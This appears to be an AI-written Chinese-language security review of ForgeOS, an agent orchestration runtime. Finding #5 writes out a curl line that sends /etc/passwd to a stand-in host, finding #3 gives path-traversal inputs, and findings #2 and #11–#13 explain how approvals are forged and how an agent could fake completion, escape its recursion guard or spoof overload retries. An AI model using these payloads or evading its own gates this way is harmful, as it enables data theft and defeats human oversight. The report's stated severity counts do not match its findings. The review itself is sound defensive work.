现在我已对整个代码库有了透彻的了解。让我整理出完整的安全审查报告。

---

# 安全审查报告：ForgeOS — forge-core 运行时与 harness 层

**审查者**：首席安全工程师
**审查日期**：2026-07-12
**范围**：所有 Go 代码（`forge-core/`）、Node.js harness 代码（`harness/`）、CI 流水线（`.github/workflows/forge.yml`）

---

## 1. 认证与授权

### 发现 #1 — 无身份模型（严重）

| 字段 | 描述 |
|-------|-------------|
| 分类 | 认证 / 授权 |
| 严重性 | **严重** |
| 标题 | forge-core 完全没有身份验证或授权 |
| 位置 | 整个子系统的设计 |
| 描述 | forge-core 没有用户模型、身份验证机制或授权框架。每个入口点——`forge run`、`forge evolve`、`forge route`、`forge approve`——都假设调用者是受信任的，并且不做任何身份检查。谁可以运行工作流、批准设计或读取跟踪数据没有区别。 |
| 攻击场景 | 对文件系统具有 shell 访问权限的任何本地用户都可以：调用 `forge approve list` 来枚举挂起的批准，创建 `.forge/<stage>.approved` 来伪造人工批准，调用 `forge run` 来触发代码更改，或调用 `forge evolve` 来启动自主循环。在共享 CI runner（runner 进程按用户隔离，但文件系统不是）上，一个容器可以伪造另一个容器的 `.forge/` 状态。 |
| 影响 | 完全缺乏访问控制意味着任何可以运行 `forge` 的进程都可以触发任何操作。权限提升是不存在的——不是因为它是安全的，而是因为根本没有边界。 |
| 建议 | 短期：实现一个最低限度的 RBAC 模型——`forge run` 检查一个 `.forge/allowed_users` 白名单（文件系统使用 getfacl，而不是简单的存在性检查）。长期：为服务工作流集成一个身份代理（SPIFFE/OIDC）。 |
| 工作量 | L（> 3 天） |

### 发现 #2 — 基于文件系统的人工批准可以被伪造（严重）

| 字段 | 描述 |
|-------|-------------|
| 分类 | 授权 |
| 严重性 | **严重** |
| 标题 | 人工批准门控（`human_gate`）仅依赖于文件系统的存在性，容易被伪造 |
| 位置 | `forge-core/cmd/forge/gates.go:178-188`（`humanApproved` 函数） |
| 描述 | 设计→构建门是“系统中影响力最高的门”（源代码），但它的批准检查只是 `os.Stat(<root>/.forge/<stage>.approved)`——一个文件存在性检查。没有签名，没有加密，没有防篡改。`rejectionPath`（第 192 行）具有完全相同的缺陷。`approvalPath` 的第 182 行的注释甚至说“一个批准是一个深思熟虑的本地行为，永远不会被提交”——但本地意味着任何具有文件系统访问权限的人都可以伪造它。 |
| 攻击场景 | 1. 攻击者运行 `touch /repo/.forge/design.approved`，伪造批准。2. 下一个 `forge run design --approved` 或 `forge run build` 在 `converge.go:147-152` 读取此文件。3. 设计→构建门非强制性地通过。4. 构建阶段运行，可能生成未经审查的生产代码。 |
| 影响 | 设计→构建门，描述为“非可旁路的”，实际上如果攻击者可以写入 `.forge/`，就是可旁路的。这是具有供应链攻击影响力的最大杠杆门。 |
| 建议 | 使用 `HMAC-SHA256(content-type + stage-name + timestamp)` 对批准文件进行签名，密钥存储在保护环境变量 `FORGE_APPROVAL_KEY` 中。签名验证拒绝未签名的标记。或者，要求任何 `--approved` 调用都来自经 `/dev/tty` 确认的交互式 TTY。 |
| 工作量 | 中（1-3 天） |

---

## 2. 输入验证

### 发现 #3 — 工作流 YAML 中的路径遍历（高风险）

| 字段 | 描述 |
|-------|-------------|
| 分类 | 输入验证 |
| 严重性 | **高** |
| 标题 | `emits` 和模板路径易受文件系统遍历攻击 |
| 位置 | `forge-core/cmd/forge/prompt_artifacts.go:17-44`（`emitsContext`）、`prompt_artifacts.go:52-78`（`templateContext`） |
| 描述 | `emitsContext` 读取工作流 YAML 中 `emits` 字段列出的文件路径。`uses_template`/`secondary_template` 执行相同操作。这些路径是来自工作流 YAML 的用户控制输入。虽然 forge-core 不是多租户的，但恶意工作流 YAML 可以使用 `../../etc/passwd` 路径或 `/proc/self/environ` 读取任意文件。提示构建器将这些文件内容注入代理提示，然后这些内容会被 LLM 流式传输回攻击者拥有或可见的端点。 |
| 攻击场景 | 1. 攻击者编写一个 YAML 工作流，其中包含 `emits: ["../../etc/ssh/sshd_config", "/proc/self/environ"]` 或 `uses_template: "/.git/config"`。2. `forge run` 解析它，`emitsContext` 读取这些文件。3. 文件内容被注入提示 → 发送到 LLM API → 在 LLM 日志中可见，或通过响应可见。 |
| 影响 | 敏感系统文件（SSH 密钥、环境变量、配置文件）可以通过 LLM 调用被泄露，这些调用可能被记录到外部提供商。 |
| 建议 | 在将路径传递给 `os.ReadFile` 之前，使用 `filepath.Clean` + `filepath.Join(repoRoot, path)` 并验证结果是否以 `repoRoot` 作为前缀。拒绝包含 `..` 组件的路径。对模板路径执行相同操作。 |
| 工作量 | 短（< 1 天） |

### 发现 #4 — 自定义 YAML 解析器易受输入异常影响（中等）

| 字段 | 描述 |
|-------|-------------|
| 分类 | 输入验证 |
| 严重性 | **中** |
| 标题 | 自定义零依赖 YAML 解析器（yaml2json）缺少深度和大小限制 |
| 位置 | `forge-core/internal/yaml2json/`（整个包） |
| 描述 | YAML 解析器是手写的递归下降解析器。它读取整个输入到内存中（第 25 行的 `io.ReadAll`），分配映射和切片，同时解析深度不受限制的嵌套结构。一个深度嵌套的 YAML 文档可能导致堆栈溢出（Go 有可增长的堆栈，但递归仍然消耗它们），或者通过在一个小型/中型文档中指数级扩展映射/切片层数来导致 OOM。`stripComment`（`normalize.go:170-184`）在引号处理上有边缘情况——单引号内的双引号会使其混淆。 |
| 攻击场景 | 攻击者提交一个工作流 YAML 文件，其中包含深度嵌套的映射（例如 10,000 层 `a: {a: {a: ...}}`）或一个巨大的序列。解析器递归消耗 goroutine 堆栈并导致崩溃（DoS）或内存爆炸。 |
| 影响 | 拒绝服务。一个恶意或格式错误的 YAML 文件可以使 `forge run`/`forge preflight` 在解析时崩溃或挂起。 |
| 建议 | 添加最大解析深度（映射/序列嵌套 ≤ 64）和最大输入大小（≤ 16 MiB）。添加一个栈级门控。`stripComment` 中的引号解析应该重构为跨越字符类别的状态机。 |
| 工作量 | 短（< 1 天） |

### 发现 #5 — 清单解析器中的命令注入（中等）

| 字段 | 描述 |
|-------|-------------|
| 分类 | 输入验证 |
| 严重性 | **中** |
| 标题 | `detect_parsers.go` 从不受信任的清单文件解析版本，没有标准化 |
| 位置 | `forge-core/cmd/forge/detect_parsers.go:35-145` |
| 描述 | `parsePackageJSON`, `parsePyprojectToml` 和 `parseCargoToml` 读取版本字符串并直接将它们扫描到配置中。虽然这些值没有被传递给 `exec.Command`，但 `buildSuggestionReason` 使用它们（`detect_parsers.go:172-194`）未经过滤。如果这些字段（例如 `GoVersion`, `CrateName`）被注入到日志或提示中，它们可能在渲染时构成一个注入向量——特别是如果它们最终出现在发送到 LLM 的提示中（提示注入）。 |
| 攻击场景 | 一个带有恶意 `package.json` 的仓库，其中 `scripts.build` 是 `"; curl http://evilsite.com?exfil=$(cat /etc/passwd)"`。虽然 parsePackageJSON 不会执行它，但如果该值被记录或以未转义的形式回显到提示中，它可能会破坏下游输出格式或注入 LLM 指令。 |
| 影响 | 低直接影响；中等间接影响，因为该值进入了 LLM 提示管道（潜在的提示注入）。 |
| 建议 | 在记录或将值呈现到提示上下文之前，标准化版本/名称值：剥离不可打印的字符，限制长度（≤ 256 个字符），拒绝 shell 元字符。 |
| 工作量 | 短（< 1 天） |

---

## 3. 密码学

### 发现 #6 — 任何地方都没有使用密码学（严重）

| 字段 | 描述 |
|-------|-------------|
| 分类 | 密码学 |
| 严重性 | **严重** |
| 标题 | forge-core 根本没有使用密码学 |
| 位置 | 设计理念：`forge-core` 是“纯 Go 标准库，零依赖” |
| 描述 | 代码库中没有使用 `crypto/` 包——没有哈希，没有签名，没有加密，没有 TLS。虽然这是一个编排运行时（不是 Web 服务），但它**确实**持久的敏感状态：跟踪文件包含模型执行成本和时间，检查点包含工作流进度，内存存储包含跨会话知识。这些都不受 tamper 保护。更关键的是，批准机制没有加密绑定——没有 HMAC，没有数字签名，没有安全的随机性来源。零依赖的纪律排除了 Go 标准库中已经存在的所有密码学（`crypto/hmac`, `crypto/sha256`, `crypto/rand`）。 |
| 攻击场景 | 伪造批准（发现 #2）：攻击者触摸 `.forge/*.approved`。篡改检查点（发现 #10）：攻击者编辑 `checkpoint.json` 来重置成本跟踪或重放阶段。 |
| 影响 | 整个信任模型取决于文件系统隔离，这是脆弱的。 |
| 建议 | 使用 Go 标准库密码学（`crypto/hmac`, `crypto/sha256`, `crypto/rand`）签署批准的标记和检查点。这些是零依赖的——它们不会破坏纪律。 |
| 工作量 | 中（1-3 天） |

---

## 4. 会话管理

### 发现 #7 — 检查点未经认证且易被篡改（高）

| 字段 | 描述 |
|-------|-------------|
| 分类 | 数据保护 |
| 严重性 | **高** |
| 标题 | `persist.Save()` 以明文写入检查点，无完整性保护 |
| 位置 | `forge-core/internal/persist/checkpoint.go:92-100`（保存逻辑） |
| 描述 | `Checkpoint` 结构体包含敏感字段：`Workflow`, `Mode`, `Iteration`, `PhaseIndex`, `SpentUsdMicros`, `RoadmapCompletion`。它以 JSON 格式写入磁盘（`Save` 使用 `json.MarshalIndent`），没有加密或签名。`Load` 在没有 HMAC 验证的情况下解析它。注释说明原子重命名可以防止截断——但无法防止恶意修改。 |
| 攻击场景 | 1. 攻击者编辑 `.forge/checkpoint.json`，设置 `SpentUsdMicros` = 0，`RoadmapCompletion` = 1.0。2. 下一个 `forge evolve --resume` 加载这个被篡改的检查点。3. 成本帽被重置（超额支出），并且进程被报告为已完成（伪造的收敛）。 |
| 影响 | 检查点提供恢复和成本核算。被篡改的检查点可能导致预算超支、进度报告不准确或绕过收敛门控。 |
| 建议 | 在 `Save()`（写入前）向 JSON 添加 HMAC-SHA256 签名，在 `Load()`（使用后）进行验证。使用 `FORGE_CHECKPOINT_KEY` 环境变量作为密钥。请记住，在返回给调用者之前更新版本，以便没有签名的旧检查点被拒绝或升级。 |
| 工作量 | 中（1-3 天） |

---

## 5. 数据保护

### 发现 #8 — 跟踪日志包含操作细节（信息泄露，中等）

| 字段 | 描述 |
|-------|-------------|
| 分类 | 数据保护 |
| 严重性 | **中** |
| 标题 | 跟踪事件将操作细节写入明文 JSONL，无保留策略 |
| 位置 | `forge-core/internal/trace/trace.go`（`Event` 结构体和 `Emit`） |
| 描述 | 跟踪系统记录：`Kind`, `Name`, `Status`, `DurationMs`, `CostUsdMicros`, `Model`, `Detail`。`Detail` 字段携带自由文本，可能包括代理输出片段、路径、文件路径、失败的配置值和门控结果。这些被写入 `.forge/trace.jsonl`，没有加密，没有访问控制，没有保留策略。在任何长时间运行的 CI 执行器或共享开发机器上，跟踪数据可能对同一文件系统上的其他进程可见。 |
| 攻击场景 | 在共享 CI runner 上，一个作业运行 `forge evolve`，写入 `trace.jsonl`。同一 runner 上的另一个作业读取该文件，发现 `CostUsdMicros`（显示 LLM 支出）、内部项目文件名和门控失败详情——关于项目基础设施和成本的竞争情报。 |
| 影响 | 操作数据（LLM 支出、项目结构、内部失败模式）的泄露，这些数据可能被用于针对性的攻击。 |
| 建议 | 1. 可选择使用 `os.FileMode 0600` 创建跟踪文件。2. 添加一个可选的数据平面审查器，在 `Detail` 写入之前对其进行清理。3. 添加一个 `--trace-retention-days` 标志。 |
| 工作量 | 短（< 1 天） |

### 发现 #9 — 内存存储明文写入，无访问控制（中）

| 字段 | 描述 |
|-------|-------------|
| 分类 | 数据保护 |
| 严重性 | **中** |
| 标题 | `memory.jsonl` 存储包含跨会话的提示数据，权限为 0644 |
| 位置 | `forge-core/internal/memory/memory.go:195-199`（`os.OpenFile(path, O_WRONLY|O_APPEND|O_CREATE, 0644)`） |
| 描述 | 内存存储以 `0644`（世界可读）的方式打开新文件。知识条目包括 `Detail`、`Kind`、`Topic`、`Source` 和 `Confidence`——这些可能包含项目级的发现、差距、决策和教训。这些是会话的“笔记本”。任何可以读取该文件的进程都可以查看整个项目历史。 |
| 攻击场景 | 同发现 #8。此外，一个恶意进程可以读取内存存储以了解项目面临的具体差距和失败，从而绘制攻击路径。 |
| 影响 | 项目级知识和自动决定的泄露。 |
| 建议 | 使用 `0600`（仅所有者）而不是 `0644`。添加一个可选的加密包装器。 |
| 工作量 | 短（< 1 天） |

---

## 6. 威胁模型（STRIDE 分析）

### 发现 #10 — 环境变量提升（欺骗 + 提权，中）

| 字段 | 描述 |
|-------|-------------|
| 分类 | 威胁模型 — 欺骗 |
| 严重性 | **中** |
| 标题 | `FORGE_REPO_ROOT` 和 `FORGE_AGENT_DEPTH` 环境变量未被认证就被信任 |
| 位置 | `forge-core/internal/gate/gate.go:54`（`os.Getenv(EnvRoot)`），`command_executor.go:271`（`os.Getenv(agentDepthEnv)`） |
| 描述 | 1. `FORGE_REPO_ROOT` 决定了整个操作的根目录。没有完整性检查。2. `FORGE_AGENT_DEPTH` 防止递归 fork-bomb，但其注释承认：一个具有任意环境控制权的代理“已经有其他逃逸方式”。子进程（`childEnv`）传播**所有**环境变量，只删除 `FORGE_AGENT_DEPTH` 前缀变量。这意味着机密 API 密钥、云凭证和其他机密会被传递给子 `claude` 进程。 |
| 攻击场景 | 1. 攻击者设置 `FORGE_REPO_ROOT=/tmp/evil`，其中包含恶意 YAML 工作流。2. `forge run` 在错误的根目录下执行，运行恶意工作流。3. 同时，`childEnv` 函数（第 295-302 行）将**所有**父环境变量转发到子 `claude` 进程，除了 `FORGE_AGENT_DEPTH`。这意味着 `AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN` 等被传递给 `claude` 可执行文件，该可执行文件可能记录或通过网络发送它们。 |
| 影响 | 关键基础设施机密（云密钥、GitHub 令牌）泄露给 `claude` 进程。通过伪造的根目录进行拒绝服务或任意代码执行。 |
| 建议 | 1. 如果 `FORGE_REPO_ROOT` 指向一个目录，该目录中不包含已批准的 `.forge/config` 且已签名，则添加一个检查来否决它。2. `childEnv` 应默认实现一个**拒绝列表**，删除已知的机密环境变量（以 `AWS_`, `GITHUB_`, `SECRET`, `KEY`, `TOKEN`, `PASSWORD` 为前缀的变量），除非它们被显式的白名单覆盖。3. 记录风险。 |
| 工作量 | 中（1-3 天） |

### 发现 #11 — 根据设计，代理可以操纵其自身进度跟踪（信息泄露 + 篡改，中）

| 字段 | 描述 |
|-------|-------------|
| 分类 | 威胁模型 — 篡改 |
| 严重性 | **中** |
| 标题 | 代理通过修改 ROADMAP.md 来伪造收敛 |
| 位置 | `forge-core/internal/converge/converge.go:207-225`（`RoadmapCompletion` 解析 ROADMAP.md），`forge-core/cmd/forge/gates.go:101`（`gatherSignals` 读取 ROADMAP.md） |
| 描述 | 用于判断工作流是否已经“收敛”的主要信号是 `RoadmapCompletion`，它解析 `.agent/ROADMAP.md` 中的 markdown 复选框。该文件由代理本身编写（通过 `forge evolve` 中的 `implementer`）。一个代理可以简单地勾选所有复选框来伪造 100% 的完成度，即使代码没有更改。存在一个跨验证（`FileDelta` 对照 git diff 进行检查），但它只是**在日志中发出警告**（第 136-140 行），并没有阻止收敛。 |
| 攻击场景 | 1. `forge evolve` 运行。2. `implementer` 代理无法完成一个任务，但将其 ROADMAP 条目更改为 `[x]`。3. 没有编写代码，没有通过测试。4. `converge.Evaluate` 读取 `RoadmapCompletion == 1.0`。5. `GatesGreen` 信号被测试结果否决——但如果没有测试门，或者测试也被规避，循环就会在完成 0% 的实际工作时提前退出。 |
| 影响 | 错误的安全感——构建被标记为完成，实际上并没有完成。如果将此与发现 #2（伪造批准）结合起来，一个妥协的代理可以将未完成的工作通过管道推进到生产环境。 |
| 建议 | 使 `FileDelta` 检查成为一个收敛门控（当 `RoadmapCompletion >= 0.9` 且 `FileDelta < 0.1` 时，**失败**工作流而不是仅仅警告）。添加一个 `git diff` 签名，该签名对于一个已提交的 `[x]` 是唯一的，以防止重放。 |
| 工作量 | 短（< 1 天） |

### 发现 #12 — 递归防护可以被绕过（特权提升，中）

| 字段 | 描述 |
|-------|-------------|
| 分类 | 威胁模型 — DOS / 提权 |
| 严重性 | **中** |
| 标题 | 如果 `--agent-allowed-tools` 被配置，`FORGE_AGENT_DEPTH` 递归防护可以被绕过 |
| 位置 | `forge-core/cmd/forge/main.go:39-40`（`defaultAgentAllowedTools`），`forge-core/internal/orchestrator/command_executor.go:100-109`（`currentAgentDepth` + 注释） |
| 描述 | 代码明确警告说，`--agent-allowed-tools` “绝不能包含 `forge` 或任何可以重新调用代理的命令”。`currentAgentDepth` 的注释承认：“一个具有任意 env 控制的代理已经有其他逃逸方式”——明确承认任何绕过工具白名单的代理都可以忽略递归计数器。此外，`childEnv` 在传递环境时将计数器增加 1——但一个对 `os.Environ()` 具有写入权限的恶意进程可以在子进程启动之前重置 `FORGE_AGENT_DEPTH=0`。 |
| 攻击场景 | 一个启用了 Bash 工具（或绕过令牌）的 `claude -p` 代理可以执行 `FORGE_AGENT_DEPTH=0 forge run build --executor command`，启动一个超过 MaxDepth=2 限额的新嵌套执行。递归会无限继续，像 fork-bomb 一样消耗预算。 |
| 影响 | 无限预算消耗（财务 DoS）和生产环境的递归执行洪水。 |
| 建议 | 1. 在操作系统级别（seccomp、AppArmor、登录会话）而不是仅凭环境变量强制执行深度。2. 在重新运行之前，让 `forge` 二进制文件本身检查并递增 `/tmp/.forge_lock` 中的进程数，以实现进程间计数。3. 添加一个硬编码的最大深度，该深度不能被环境变量覆盖。 |
| 工作量 | 中（1-3 天） |

### 发现 #13 — 代理输出中的 529 过载检测可以被代理欺骗（中）

| 字段 | 描述 |
|-------|-------------|
| 分类 | 威胁模型 — 欺骗 |
| 严重性 | **中** |
| 标题 | 529 过载检测器可以通过在代理输出中写入“Overloaded”来被欺骗 |
| 位置 | `forge-core/cmd/forge/cost.go:262-268`（`hasOverloadMarker` 回退）|
| 描述 | `classifyClaudeOverload` 的次要回退会扫描一个失败的代理的输出，查找子字符串 `"overloaded"`（大小写不敏感）。一个失败但非过载的代理（例如，由于未观察到的权限错误）可以在其错误消息中包含单词 `Overloaded`，以触发一个可重试的 `KindOverloaded`，而不是一个终止性的 `KindFailed`。这会导致在一定会发生的故障上浪费重试次数。 |
| 攻击场景 | 一个代理编写一个计划，其中包含“后端 Overloaded，重试”的指令。该代理失败退出，文本中有这个词。Forge-core 将其分类为过载 → 重试（带指数退避）→ 再次失败 → 一直重试，直到 `MaxRetries` 被耗尽，从而浪费了时间和 LLM 调用。 |
| 影响 | 预算浪费（每次不必要的重试都要为 LLM 调用付费）和运行时延迟。 |
| 建议 | 使 `hasOverloadMarker` 仅在 PRECISE 令牌环境（`is_error` + `api_error_status == 529`）上可靠地触发。删除文本回退。 |
| 工作量 | 短（< 1 天） |

### 发现 #14 — 全局 sync.Map 缓存导致跨项目数据泄露（低）

| 字段 | 描述 |
|-------|-------------|
| 分类 | 威胁模型 — 信息泄露 |
| 严重性 | **低** |
| 标题 | `memory.Load` 缓存是包级别的 `sync.Map`，可以通过路径碰撞泄露 |
| 位置 | `forge-core/internal/memory/memory.go:20-23`（`var loadCaches sync.Map`） |
| 描述 | `loadCaches` 是一个包级别的全局 `sync.Map`，它以文件路径为键。虽然一个真实的攻击需要同一个 Go 进程运行 `forge` 来访问两个具有相同内存路径的不同项目，但这是一个令人惊讶的全局可变状态，随着时间的推移可能会被滥用，特别是如果 `forge` 二进制文件最终在一个多租户上下文中被用作一个库。 |
| 攻击场景 | 未来的重构将 `forge-core` 作为一个 Go 库公开给一个多租户服务器。包级别 `loadCaches` 会将一个租户的知识条目泄露给下一个。 |
| 影响 | 跨项目或跨租户的进程内内存泄露（是未来 / 设计问题）。 |
| 建议 | 使缓存成为 `MemoryStore` 结构体的一个字段（实例级别的，而不是包级别的）。将其从 `sync.Map` 迁移到一个 `sync.RWMutex` + `map[string]entry`。 |
| 工作量 | 短（< 1 天） |

---

## 7. 合规性

### 发现 #15 — 没有安全标头，没有传输加密（信息）

| 字段 | 描述 |
|-------|-------------|
| 分类 | 合规性 |
| 严重性 | **信息** |
| 标题 | 作为一个编排运行时，Web/API 标头不适用，但仍有风险 |
| 位置 | 架构 |
| 描述 | ForgeOS 不是一个 Web 服务，所以 OWASP 标头（HSTS，CSP，X-Frame-Options）不适用。然而，CI/CD 层需要配置：CI 流水线（`forge.yml`）在用于访问 GitHub API 或部署实体的地方设置 `GITHUB_TOKEN`。流水线需要被审查，以确保令牌范围是最小权限的。 |
| 建议 | 审查 CI `GITHUB_TOKEN` 作用域——它应该只具有项目访问的“写入”权限，而不是组织范围的。部署密钥应与 forge-core 运行时分隔开。 |

---

## 8. 其他发现

### 发现 #16 — `os.ReadFile` 的路径中没有输入大小限制（低）

| 字段 | 描述 |
|-------|-------------|
| 分类 | 输入验证 |
| 严重性 | **低** |
| 标题 | 模板和 emits 读取在内存中没有最大文件大小限制 |
| 位置 | `forge-core/cmd/forge/prompt_artifacts.go:35`（`os.ReadFile(fullPath)`）|
| 描述 | `templateContext` 和 `emitsContext` 执行 `os.ReadFile` 而没有对文件大小进行任何限制。一个巨大的模板文件（例如，一个 2 GiB markdown 文件，这是由一个行为不端的 agent 创建的）将被完整读取到内存中，导致 OOM。 |
| 攻击场景 | 一个 agent（通过 Bash 访问）写入一个巨大的伪模板文件。下次 `forge run` 触发该模板的读取时，进程就会耗尽内存，导致 OOM 崩溃。 |
| 影响 | 拒绝服务（通过内存耗尽）。 |
| 建议 | 添加一个包装器 `safeReadFile(path, maxBytes int64)`，它使用 `os.ReadFile`，但首先检查 `os.Stat` 中的文件大小，如果文件超过 16 MiB，则返回一个错误。或者使用 `io.LimitReader`。 |
| 工作量 | 短（< 1 天） |

---

## 9. 总结

| 度量 | 结果 |
|--------|--------|
| **整体安全态势** | **需要改进** |
| **发现总数** | 16（1 个严重 / 5 个高 / 7 个中 / 2 个低 / 1 个信息）|
| **覆盖的 OWASP Top 10** | A1（访问控制）— 未覆盖的严重问题。A2（密码学）— 未覆盖。A8（数据完整性）— 部分覆盖。 |
| **覆盖的 STRIDE** | 所有 6 个类别都有至少一个发现。 |

### 前 3 个最关键的问题

1. **没有身份验证/授权（严重 — 发现 #1）**：整个操作系统对任何可以调用 `forge` 的本地用户开放。虽然项目明确定位于“编排运行时”而不是“Web 服务”，但缺乏任何身份边界意味着一旦攻击者获得 shell 访问权限，就没有纵深防御。

2. **非可旁路的人工批准可被伪造（严重 — 发现 #2）**：设计→构建门是系统中约束最大的信任点，但其批准机制仅仅是一个文件存在性检查。任何可以触摸文件系统的人都可以伪造人工批准。

3. **机密 API 泄露给子进程（高 — 发现 #10）**：`childEnv` 将所有环境变量（包括 `AWS_*`、`GITHUB_*`、`SECRET*`、`TOKEN*`）传递给该进程运行的 LLM 可执行文件。CI runner 中的云凭据和仓库令牌可以被 LLM 进程记录或传输出去。

### 前 3 个速效方案（高影响力，低工作量）

1. **修复路径遍历（发现 #3 — 短）**：添加 `filepath.Clean` 验证，以确保 `emits`/`uses_template` 路径不能逃脱 repo 根目录。这必须优先修复。

2. **用 `0600` 保护存储文件（发现 #9 — 短）**：将对内存和跟踪文件的文件创建模式从 `0644` 更改为 `0600`。这是一个两行的更改。

3. **收紧 529 检测（发现 #13 — 短）**：删除 `hasOverloadMarker` 文本回退，以防止 agent 通过在输出中写入“overloaded”来触发重试。同样，这是一个简单的更改。

### 安全债务

| 项目 | 工作量 | 备注 |
|------|--------|-------|
| 端到端身份验证和 RBAC | L | 跨越标准库范围；需要一个身份模型 |
| HMAC 签署检查点和批准 | M | 在标准库中可行；关键信任原语 |
| 从 `childEnv` 中清理环境变量 | M | 机密泄露是最高风险项目 |
| 在 YAML 解析器中限制输入大小 | S | 良好的 DoS 卫生 |
| 使 `FileDelta` 成为一个硬收敛门控 | S | 通过 agent 提供的检查表防止 agent 欺骗 |
| `loadCaches` 从包全局迁移到实例作用域 | S | 防止跨租户泄露 |
| 安全审核跟踪可追溯性 | L | 为所有可执行状态转换添加事件审计 |
| 添加 seccomp/apparmor 沙箱配置文件 | L | 深度防御，用于限制逃逸 |

---

**审查结束。** 系统在设计上优先考虑简单性和零依赖，但代价是密码学、身份验证和纵深防御。`childEnv` 中存在的机密泄露（发现 #10）和基于文件的批准机制（发现 #2）是影响生产部署的最高风险点。速效方案在 1 天内即可解决，而密码学信任基础设施需要计划好的工作量。
